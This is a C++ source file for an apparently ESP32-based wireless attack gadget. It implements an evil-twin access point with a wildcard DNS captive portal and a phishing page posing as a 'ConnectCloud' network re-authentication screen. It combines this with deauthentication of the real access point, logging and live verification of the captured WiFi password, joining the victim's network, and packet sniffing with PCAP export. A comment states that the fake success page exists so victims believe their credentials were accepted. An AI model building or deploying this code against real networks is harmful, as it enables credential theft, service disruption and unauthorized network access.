#include "attack_sniff.h"
#include "oled_ui.h"
#include "muscle_link.h"
#include "scan.h"
#include "menu_nav.h"   // BTN_* pins
#include "xenomorph_protocol.h"

#include <WiFi.h>

// ============================================================================
// attack_sniff.cpp — Evil twin + sniffing + info screens + captive portal.
//
// Owns: isAttacking, loginReceived, capturedPass, passwordVerified,
//       attackStartTime, isSniffing, sniffPacketCount, sniffBufferSize,
//       pcapReady, dnsServer, server, apIP, DNS_PORT, index_html.
//
// Lambda captures in startEvilTwin: server / capturedPass / loginReceived /
// index_html are all defined in this translation unit, so [&] resolves them
// without any extra extern declarations.
// ============================================================================

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer  dnsServer;
WebServer  server(80);

bool     isAttacking       = false;
bool     loginReceived     = false;
String   capturedPass      = "No Data Yet";
bool     passwordVerified  = false;
uint32_t attackStartTime   = 0;

bool     isSniffing        = false;
uint32_t sniffPacketCount  = 0;
uint32_t sniffBufferSize   = 0;
uint8_t  sniffMethod       = 0x00;   // 0x00=ALL/EAPOL, 0x03=PROBE
bool     pcapReady         = false;
bool     isJoined          = false;

// PROBE summary state — written by parseMuscleNotification, read by OLED UI.
ProbeSummary probeTop = { "", {0,0,0,0,0,0}, 0, 0, 0 };

// Captive-portal HTML served on /login. Stored in PROGMEM to save RAM.
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #f0f2f5;
    color: #1c1e21;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 24px;
  }
  .card {
    background: #ffffff;
    width: 100%;
    max-width: 360px;
    border-radius: 8px;
    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
    padding: 28px 24px 22px;
  }
  .brand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 18px;
  }
  .logo {
    width: 28px;
    height: 28px;
    border-radius: 6px;
    background: #1877f2;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-weight: 700;
    font-size: 16px;
    letter-spacing: -0.5px;
  }
  .brand-name {
    font-size: 17px;
    font-weight: 600;
    color: #1877f2;
  }
  h1 {
    font-size: 18px;
    font-weight: 500;
    text-align: center;
    margin-bottom: 6px;
    color: #1c1e21;
  }
  .sub {
    text-align: center;
    font-size: 13px;
    color: #606770;
    margin-bottom: 22px;
    line-height: 1.45;
  }
  label {
    display: block;
    font-size: 12px;
    color: #606770;
    margin-bottom: 6px;
    font-weight: 500;
  }
  .pw-wrap {
    position: relative;
    margin-bottom: 18px;
  }
  input[type="password"], input[type="text"] {
    width: 100%;
    height: 44px;
    padding: 0 44px 0 14px;
    border: 1px solid #ccd0d5;
    border-radius: 6px;
    background: #f5f6f7;
    font-size: 15px;
    color: #1c1e21;
    outline: none;
    transition: border-color 0.15s, background 0.15s;
  }
  input:focus {
    border-color: #1877f2;
    background: #ffffff;
  }
  input.invalid {
    border-color: #e41e3f;
  }
  .toggle {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: #1877f2;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    padding: 6px 8px;
    border-radius: 4px;
    text-transform: uppercase;
    letter-spacing: 0.3px;
  }
  .toggle:hover { background: #e7f0fd; }
  .hint {
    font-size: 11px;
    color: #e41e3f;
    margin-top: -12px;
    margin-bottom: 14px;
    display: none;
  }
  .hint.show { display: block; }
  button.primary {
    width: 100%;
    height: 44px;
    background: #1877f2;
    color: #ffffff;
    border: none;
    border-radius: 6px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.15s;
  }
  button.primary:hover { background: #166fe5; }
  button.primary:disabled {
    background: #9cb4d4;
    cursor: not-allowed;
  }
  .footer {
    margin-top: 22px;
    padding-top: 16px;
    border-top: 1px solid #e4e6eb;
    font-size: 11px;
    color: #8a8d91;
    text-align: center;
    line-height: 1.5;
  }
  .footer a { color: #606770; text-decoration: none; }
</style>
</head>
<body>
  <div class="card">
    <div class="brand">
      <span class="logo">C</span>
      <span class="brand-name">ConnectCloud</span>
    </div>
    <h1>Network Re-authentication</h1>
    <p class="sub">Your session has expired. Please enter your WiFi password to continue browsing.</p>
    <form action="/login" method="POST" id="loginForm" autocomplete="on">
      <label for="password">WiFi Password</label>
      <div class="pw-wrap">
        <input id="password" name="password" type="password" minlength="8" maxlength="63"
               placeholder="Enter your password" required autocomplete="current-password">
        <button type="button" class="toggle" id="toggleBtn" aria-label="Show password">Show</button>
      </div>
      <div class="hint" id="hint">Password must be at least 8 characters.</div>
      <button type="submit" class="primary" id="submitBtn">Sign in</button>
    </form>
    <div class="footer">
      Secure connection &middot; &copy; ConnectCloud Network Services<br>
      <a href="#">Help</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a>
    </div>
  </div>
<script>
  (function() {
    var pw  = document.getElementById('password');
    var btn = document.getElementById('toggleBtn');
    var sub = document.getElementById('submitBtn');
    var hint = document.getElementById('hint');
    var form = document.getElementById('loginForm');

    function update() {
      var ok = pw.value.length >= 8;
      sub.disabled = !ok;
      if (pw.value.length === 0) {
        hint.classList.remove('show');
        pw.classList.remove('invalid');
      } else if (!ok) {
        hint.classList.add('show');
        pw.classList.add('invalid');
      } else {
        hint.classList.remove('show');
        pw.classList.remove('invalid');
      }
    }

    btn.addEventListener('click', function() {
      if (pw.type === 'password') {
        pw.type = 'text';
        btn.textContent = 'Hide';
      } else {
        pw.type = 'password';
        btn.textContent = 'Show';
      }
      pw.focus();
    });

    pw.addEventListener('input', update);
    form.addEventListener('submit', function(e) {
      if (pw.value.length < 8) {
        e.preventDefault();
        hint.classList.add('show');
        pw.classList.add('invalid');
        pw.focus();
      } else {
        sub.disabled = true;
        sub.textContent = 'Signing in...';
      }
    });

    update();
  })();
</script>
</body>
</html>
)rawliteral";

// Forward declarations for helpers defined in the .ino (Arduino IDE's
// auto-prototype pass only covers functions defined in .ino, but other .cpp
// files need explicit declarations to call them).
void showMessage(const char* icon, const char* msg, uint32_t autoMs);
bool ensureMuscleConnected();
void updateDisplay();

// ---------------------------------------------------------------------------
// Evil twin
// ---------------------------------------------------------------------------
void startEvilTwin() {
  if (!ensureMuscleConnected()) return;
  if (!targetScanned || discoveredCount == 0) {
    showMessage(ICON_ERR, "NO TARGET!", 1500);
    return;
  }

  String ssid = discoveredSSIDs[targetIndex];
  uint8_t channel = discoveredChannels[targetIndex];
  uint8_t bssid[6];
  memcpy(bssid, discoveredBSSID[targetIndex], 6);

  isAttacking = true;
  attackStartTime = millis();

  // Deployment screen — show briefly, then continue setup
  {
    display.clearDisplay();
    drawFrame();
    drawHeader(ICON_ATTACK " DEPLOY");
    drawCenteredText(14, ICON_ATTACK, 2);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    int w = strlen(ssid.c_str()) * CHAR_W;
    display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 40);
    display.print(ssid);
    display.setCursor(50, 50);
    display.print("COMBINE");
    drawFooter(NULL, "PLS WAIT");
    display.display();
    delay(800);
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid.c_str(), "");

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", index_html);
  });
  server.on("/generate_204", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/hotspot-detect.html", []() {
    server.send(200, "text/html", index_html);
  });
  server.on("/login", HTTP_POST, [&]() {
    // Reject submissions that bypass the client-side minlength check.
    if (!server.hasArg("password") || server.arg("password").length() < 8) {
      Serial.println("[CAPTIVE] Rejected: password too short");
      server.send(400, "text/plain", "Password must be at least 8 characters.\n");
      return;
    }
    capturedPass = server.arg("password");
    Serial.print("CAPTURED: ");
    Serial.println(capturedPass);
    loginReceived = true;
    // Professional "sign-in successful" page rather than leaking
    // "VERIFICATION IN PROGRESS" — the user should think the network
    // simply accepted their credentials.
    server.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
      "<meta http-equiv=\"refresh\" content=\"3;url=http://192.168.4.1/\">"
      "<title>Connecting...</title>"
      "<style>"
      "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;color:#1c1e21;}"
      ".card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.08);padding:32px 24px;width:90%;max-width:320px;text-align:center;}"
      ".spinner{width:36px;height:36px;border:3px solid #e4e6eb;border-top-color:#1877f2;border-radius:50%;margin:0 auto 16px;animation:spin 1s linear infinite;}"
      "@keyframes spin{to{transform:rotate(360deg);}}"
      "h1{font-size:16px;font-weight:500;margin-bottom:6px;}"
      "p{font-size:13px;color:#606770;}"
      "</style></head><body>"
      "<div class=\"card\"><div class=\"spinner\"></div>"
      "<h1>Re-establishing your connection</h1>"
      "<p>This will only take a moment.</p></div></body></html>");
  });
  server.onNotFound([]() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
  });
  server.begin();

  sendStartDeauth(ssid, channel, bssid, XENO_METHOD_COMBINE, 300);
  showMessage(ICON_ATTACK, "ATTACK ACTIVE", 1500);
}

void stopAttack() {
  if (!isAttacking) return;

  isAttacking = false;
  passwordVerified = false;
  capturedPass = "No Data Yet";
  loginReceived = false;
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  sendStopDeauth();
  showMessage(ICON_IDLE, "ATTACK STOPPED", 1500);
}

void verifyCapturedPassword() {
  if (capturedPass == "No Data Yet") {
    showMessage(ICON_ERR, "NO PASSWORD!", 1500);
    return;
  }

  String ssid = discoveredSSIDs[targetIndex];
  uint8_t channel = discoveredChannels[targetIndex];
  uint8_t bssid[6];
  memcpy(bssid, discoveredBSSID[targetIndex], 6);

  // Trim whitespace / control chars that may have leaked in from the POST body.
  // A trailing \r or \n in the password will silently break WPA handshake
  // and produce false "PASSWORD WRONG" results.
  capturedPass.trim();

  // Detailed debug — what are we actually trying to authenticate with?
  Serial.println("========================================");
  Serial.printf("[VERIFY] Target SSID : '%s'\n", ssid.c_str());
  Serial.printf("[VERIFY] Channel     : %d\n", channel);
  Serial.printf("[VERIFY] BSSID       : %02X:%02X:%02X:%02X:%02X:%02X\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  Serial.printf("[VERIFY] Password    : '%s' (len=%u)\n",
                capturedPass.c_str(), (unsigned)capturedPass.length());
  Serial.printf("[VERIFY] PW bytes    :");
  for (unsigned i = 0; i < capturedPass.length(); i++) {
    Serial.printf(" %02X", (uint8_t)capturedPass[i]);
  }
  Serial.println();
  Serial.println("========================================");

  // Stop everything — deauth, web server, captive portal
  isAttacking = false;
  sendStopDeauth();
  // Give the Muscle (and the target AP it's been deauthing) a moment to settle.
  // The target AP may still be in a recovering state right after deauth stops;
  // trying WiFi.begin() immediately frequently produces false negatives.
  delay(2500);
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);

  // Power-cycle the WiFi radio so softAP → STA transition is clean.
  // ESP32-S3 leaves internal state inconsistent after softAP teardown
  // (channel cache, BSSID cache, scan_method default) — many "PASSWORD WRONG"
  // false negatives trace back to this transition, not to wrong credentials.
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Wait for the STA interface to actually settle before scanning.
  uint32_t settle = millis();
  while (WiFi.status() != WL_DISCONNECTED && (millis() - settle) < 1500) {
    delay(20);
  }
  Serial.printf("[VERIFY] Post-transition status: %d\n", (int)WiFi.status());

  // Show verifying screen with cancel hint
  display.clearDisplay();
  drawFrame();
  drawHeader(ICON_SNIFF " VERIFY");
  drawCenteredText(14, ICON_SNIFF, 2);

  // Truncate SSID for display
  String shortSSID = ssid;
  if (shortSSID.length() > 16) shortSSID = shortSSID.substring(0, 16);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  int w = strlen(shortSSID.c_str()) * CHAR_W;
  display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 36);
  display.print(shortSSID);
  drawLoadingDots(46, "");
  drawFooter(NULL, "[ANY KEY] CANCEL");
  display.display();

  // Issue the connect using the locked BSSID + channel. The 4-arg form
  //   WiFi.begin(ssid, password, channel, bssid)
  // is supported by Arduino-ESP32 and skips the multi-channel scan entirely,
  // so we don't race the AP's beacon or accidentally latch onto a neighbour
  // BSSID with the same SSID — that race is the most common cause of
  // "PASSWORD WRONG" when the captured credential is in fact correct.
  char ssidBuf[33];
  ssid.toCharArray(ssidBuf, sizeof(ssidBuf));
  Serial.printf("[VERIFY] WiFi.begin('%s', PW, ch=%d, %02X:%02X:%02X:%02X:%02X:%02X)\n",
                ssidBuf, channel,
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

  // Many false-negatives (especially on mobile browsers) are caused by one of
  // three things:
  //   1. SoftAP teardown leaves the STA radio in a dirty state
  //   2. The AP is congested/busy right after deauth, rejecting the assoc
  //   3. STA connects but DHCP takes >20s behind a NAT
  // We recover from each by doing up to 3 retries with incremental delays.
  const int MAX_RETRIES = 3;
  const int PER_RETRY_MS = 25000;
  bool verified = false;
  bool cancelled = false;

  for (int attempt = 0; attempt < MAX_RETRIES && !verified; attempt++) {
    wl_status_t lastStatus = WL_IDLE_STATUS;

    if (attempt > 0) {
      // Between retries fully tear down the STA radio and give the AP time
      // to recover.  On attempt 2 we also increase the inter-retry delay
      // because heavy congestion may need more time.
      WiFi.disconnect(false);  // do NOT unjoin so we don't trigger full reconnect
      int gap = (attempt == 2) ? 5000 : 2000;
      Serial.printf("[VERIFY] Attempt %d/%d — retrying in %dms\n", attempt + 1, MAX_RETRIES, gap);
      delay(gap);

      // Show verifying screen during retry gap so UI isn't frozen
      display.clearDisplay();
      drawFrame();
      drawHeader(ICON_SNIFF " VERIFY");
      drawCenteredText(14, ICON_SNIFF, 2);
      display.setTextSize(1);
      display.setTextColor(WHITE);
      display.setCursor(0, 42);
      display.print("Retry ");
      display.print(attempt);
      drawLoadingDots(20, "RETRY");
      drawFooter(NULL, "[ANY KEY] CANCEL");
      display.display();
    }

    // Re-issue the connect (WiFi.begin re-applies the config).
    WiFi.begin(ssidBuf, capturedPass.c_str(), channel, bssid);

    // --- Cancel + timeout loop ---
    uint32_t start = millis();
    uint8_t dotPhase = 0;

    while (WiFi.status() != WL_CONNECTED && (millis() - start) < PER_RETRY_MS) {
      delay(10);
      wl_status_t cur = WiFi.status();
      if (cur != lastStatus) {
        Serial.printf("[VERIFY] R%d status -> %d @ %lu ms\n",
                      attempt + 1, (int)cur, (unsigned long)(millis() - start));
        lastStatus = cur;
      }

      // Any button press cancels immediately.
      if (digitalRead(BTN_LEFT) == LOW ||
          digitalRead(BTN_RIGHT) == LOW ||
          digitalRead(BTN_PUSH) == LOW ||
          digitalRead(BTN_UP) == LOW ||
          digitalRead(BTN_DOWN) == LOW) {
        Serial.println("[VERIFY] Cancelled by user");
        cancelled = true;
        break;
      }

      // Animate dots
      dotPhase = (millis() - start) / 250;
      switch (dotPhase % 4) {
        case 0: display.setCursor((XENO_SCREEN_WIDTH - 16) / 2, 56); display.print("."); break;
        case 1: display.setCursor((XENO_SCREEN_WIDTH - 16) / 2 + 6, 56); display.print("."); break;
        case 2: display.setCursor((XENO_SCREEN_WIDTH - 16) / 2 + 12, 56); display.print("."); break;
      }
      display.display();
    }

    if (!cancelled && WiFi.status() == WL_CONNECTED) {
      // Extra safety: confirm DHCP actually completed by re-checking after
      // a brief settling period.  Sometimes status flips to CONNECTED
      // before DHCP finishes.
      delay(500);
      if (WiFi.status() == WL_CONNECTED && WiFi.localIP() != INADDR_NONE) {
        verified = true;
        Serial.printf("[VERIFY] R%d SUCCESS — IP=%s @ %lu ms\n",
                      attempt + 1, WiFi.localIP().toString().c_str(),
                      (unsigned long)(millis() - start));
      } else {
        Serial.printf("[VERIFY] R%d DHCP not ready (%d, ip=%s)\n",
                      attempt + 1, (int)WiFi.status(),
                      WiFi.localIP().toString().c_str());
      }
    }
  }

  // Always tear down the WiFi attempt before reporting so we don't leave the
  // radio hanging mid-scan if the user cancelled mid-flight.
  WiFi.disconnect();

  // Report result — use the `verified` flag from the retry loop instead of
  // checking WiFi.status() which may have been torn down by WiFi.disconnect().
  if (cancelled) {
    Serial.println("[VERIFY] Cancelled — no result.");
    showMessage(ICON_ATTACK, "CANCELLED", 1500);
  } else if (verified) {
    passwordVerified = true;
    Serial.println("[VERIFIED] Password is CORRECT!");
    showMessage(ICON_OK, "PASSWORD OK!", 3000);
  } else {
    passwordVerified = false;
    Serial.printf("[FAILED] Password is WRONG or AP unreachable (after %d retries).\n", MAX_RETRIES);
    showMessage(ICON_ERR, "PASSWORD WRONG", 3000);
  }

  // Return to menu
  WiFi.mode(WIFI_OFF);
  updateDisplay();
}

// ---------------------------------------------------------------------------
// Sniffing
// ---------------------------------------------------------------------------
void startSniffing() {
  if (!ensureMuscleConnected()) return;
  if (!targetScanned || discoveredCount == 0) {
    showMessage(ICON_ERR, "NO TARGET!", 1500);
    return;
  }

  uint8_t channel = discoveredChannels[targetIndex];
  uint8_t bssid[6];
  memcpy(bssid, discoveredBSSID[targetIndex], 6);

  char chBuf[16];
  snprintf(chBuf, sizeof(chBuf), "CH:%d", channel);

  // Brief deploy screen, then send
  {
    display.clearDisplay();
    drawFrame();
    drawHeader(ICON_SNIFF " START");
    drawCenteredText(14, ICON_SNIFF, 2);
    int w = strlen(chBuf) * CHAR_W;
    display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 40);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.print(chBuf);
    drawFooter(NULL, "SENDING");
    display.display();
    delay(500);
  }

  sendStartSniff(channel, bssid, XENO_SNIFF_ALL);
  sniffMethod = XENO_SNIFF_ALL;
  showMessage(ICON_SNIFF, "SNIFFING STARTED", 1500);
}

// PROBE mode is passive area-wide — does not need a target BSSID/channel.
// Firmware will hop channel 1..13 automatically. Channel 1 here is just the
// initial hop; BSSID NULL = broadcast.
void startProbeMode() {
  if (!ensureMuscleConnected()) return;

  sendStartSniff(1, NULL, XENO_SNIFF_PROBE);
  sniffMethod = XENO_SNIFF_PROBE;
  resetProbeScroll();
}

// Stop sniffing with notification handling — wait up to 3s for
// XENO_NOTIFY_SNIFF_STOP, animating loading dots during the wait.
void stopSniffing() {
  if (!isSniffing) {
    showMessage(ICON_OFFLINE, "NOT SNIFFING", 1500);
    return;
  }

  sendStopSniff();

  uint32_t start = millis();
  bool stopped = false;
  oled_resetDots();
  uint32_t lastDot = 0;

  while (millis() - start < 3000) {
    checkMuscleNotifications();
    if (!isSniffing) { stopped = true; break; }

    // Redraw loading screen periodically
    if (millis() - lastDot > 250) {
      tickDots();
      lastDot = millis();
      display.clearDisplay();
      drawFrame();
      drawHeader(ICON_SNIFF " STOP");
      drawCenteredText(14, ICON_SNIFF, 2);
      drawLoadingDots(40, "STOPPING");
      drawFooter(NULL, "LEFT=BACK");
      display.display();
    }
    delay(10);
  }

  if (stopped) {
    pcapReady = (sniffBufferSize > 0);
    Serial.printf("[STOP] success: %u packets, %u bytes\n", sniffPacketCount, sniffBufferSize);
    char pktBuf[32];
    snprintf(pktBuf, sizeof(pktBuf), "%u PACKETS", sniffPacketCount);
    showMessage(ICON_OK, pktBuf, 1500);
  } else {
    Serial.println("[STOP] timeout: XENO_NOTIFY_SNIFF_STOP not received in 3s");
    isSniffing = false;
    if (sniffBufferSize > 0) {
      pcapReady = true;
    }
    showMessage(ICON_ERR, "STOPPED (TIMEOUT)", 1500);
  }
}

void downloadPcap() {
  if (!pcapReady) {
    showMessage(ICON_OFFLINE, "NO PCAP DATA", 1500);
    return;
  }

  // Custom layout — "192.168.4.1/pcap" is 17 chars which overflows the body
  // when paired with another line, so we split the URL across two body lines.
  display.clearDisplay();
  drawFrame();
  drawHeader(ICON_OK " PCAP READY");
  drawCenteredText(12, ICON_OK, 2);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  const char* line1 = "Connect to:";
  const char* line2 = "192.168.4.1";
  const char* line3 = "/pcap";
  int w;
  w = strlen(line1) * CHAR_W; display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 28); display.print(line1);
  w = strlen(line2) * CHAR_W; display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 38); display.print(line2);
  w = strlen(line3) * CHAR_W; display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 46); display.print(line3);
  drawFooter(NULL, "ANY=BACK");
  display.display();

  // Wait for any button to dismiss
  while (digitalRead(BTN_LEFT) == HIGH &&
         digitalRead(BTN_RIGHT) == HIGH &&
         digitalRead(BTN_PUSH) == HIGH &&
         digitalRead(BTN_UP) == HIGH &&
         digitalRead(BTN_DOWN) == HIGH) {
    delay(10);
  }
  delay(200);
  updateDisplay();
}

// ---------------------------------------------------------------------------
// Info screens
// ---------------------------------------------------------------------------
void showCredentials() {
  display.clearDisplay();
  drawFrame();
  drawHeader(ICON_OK " CAPTURED");

  // Body — truncated to fit cleanly
  display.setTextSize(1);
  display.setTextColor(WHITE);
  String pass = capturedPass;
  if (pass.length() > 21) pass = pass.substring(0, 21);

  // Big credential at size 2, centered, with scrolling for long passphrases
  if (pass.length() <= 10) {
    drawCenteredText(28, pass.c_str(), 2);
  } else {
    int w = pass.length() * CHAR_W;
    display.setCursor((XENO_SCREEN_WIDTH - w) / 2, 32);
    display.print(pass);
  }
  drawFooter(NULL, "LEFT=BACK");
  display.display();
  while (digitalRead(BTN_LEFT) == HIGH) delay(10);
  delay(200);
  updateDisplay();
}

void showSystemInfo() {
  display.clearDisplay();
  drawFrame();
  drawHeader("SYSTEM INFO");

  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(CONTENT_X, 16);
  display.print("Core: ESP32-S3");

  display.setCursor(CONTENT_X, 28);
  display.print("Muscle: ");
  display.print(muscleConnected ? ICON_OK " ONLINE" : ICON_OFFLINE " OFFLINE");

  display.setCursor(CONTENT_X, 40);
  display.print("Mode:   ");
  if (isAttacking) display.print(ICON_ATTACK " ATTACK");
  else if (isSniffing) display.print(ICON_SNIFF " SNIFF");
  else display.print(ICON_IDLE " IDLE");

  drawFooter(NULL, "LEFT=BACK");
  display.display();
  while (digitalRead(BTN_LEFT) == HIGH) delay(10);
  delay(200);
  updateDisplay();
}

// ===========================================================================
// Join Target Network — connect Muscle ESP32 to the target AP
// ===========================================================================

void joinTargetNetwork() {
  if (!ensureMuscleConnected()) return;
  if (!targetScanned || discoveredCount == 0) {
    showMessage(ICON_ERR, "NO TARGET!", 1500);
    return;
  }
  if (!passwordVerified || capturedPass == "No Data Yet") {
    showMessage(ICON_ERR, "NO PASSWORD!", 1500);
    return;
  }

  String ssid = discoveredSSIDs[targetIndex];
  uint8_t channel = discoveredChannels[targetIndex];
  uint8_t bssid[6];
  memcpy(bssid, discoveredBSSID[targetIndex], 6);

  Serial.printf("[JOIN] Target: \"%s\" CH=%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X PW=\"%s\"\n",
                ssid.c_str(), channel,
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                capturedPass.c_str());

  // Send JOIN_NETWORK command to Muscle with captured password
  sendJoinNetwork(ssid, channel, bssid, capturedPass);

  // Enter join progress screen
  showJoinProgressScreen();
}

void showJoinProgressScreen() {
  uint32_t startTime = millis();
  uint32_t lastUpdate = 0;

  while (true) {
    // Drain UART — JOIN_OK must be parsed to flip joinState.joined
    checkMuscleNotifications();

    // Update every 500ms
    if (millis() - lastUpdate > 500) {
      lastUpdate = millis();

      display.clearDisplay();
      drawFrame();
      drawHeader(ICON_JOIN " JOIN NETWORK");

      display.setTextSize(1);
      display.setTextColor(WHITE);
      display.setCursor(CONTENT_X, 22);

      String ssid = targetScanned ? discoveredSSIDs[targetIndex] : "?";
      display.print("SSID: ");
      display.println(ssid);

      display.setCursor(CONTENT_X, 32);
      if (joinState.joined) {
        isJoined = true;
        display.print("[OK] Connected");

        display.setCursor(CONTENT_X, 42);
        display.print("IP: ");
        display.print(joinState.ip[0]); display.print('.');
        display.print(joinState.ip[1]); display.print('.');
        display.print(joinState.ip[2]); display.print('.');
        display.print(joinState.ip[3]);
        display.print(" RSSI=");
        display.print(joinState.rssi);

        // GW shown smaller on line 52 — still above FOOTER_Y (56)
        display.setCursor(CONTENT_X, 52);
        display.print("GW: ");
        display.print(joinState.gateway[0]); display.print('.');
        display.print(joinState.gateway[1]); display.print('.');
        display.print(joinState.gateway[2]); display.print('.');
        display.print(joinState.gateway[3]);
      } else {
        // Show connecting animation
        display.print("Connecting");
        uint16_t dots = (millis() / 300) % 4;
        for (uint16_t i = 0; i < dots; i++) display.print(".");
      }

      drawFooter(NULL, "LEFT=CANCEL");
      display.display();
    }

    // Check for LEFT button (cancel)
    if (digitalRead(BTN_LEFT) == LOW) {
      sendDisconnectSta();
      isJoined = false;
      delay(200);
      break;
    }

    // Timeout after 120 seconds
    if (millis() - startTime > 120000) {
      sendDisconnectSta();
      isJoined = false;
      delay(200);
      break;
    }

    // If connected and user presses RIGHT, exit immediately
    if (joinState.joined && digitalRead(BTN_RIGHT) == LOW) {
      delay(200);
      break;
    }

    delay(50);
  }

  // Go back to EVIL TWIN menu
  currentMenu = MENU_EVIL_TWIN;
  menuIndex = 1;  // Position on the JOIN NETWORK item
  updateDisplay();
}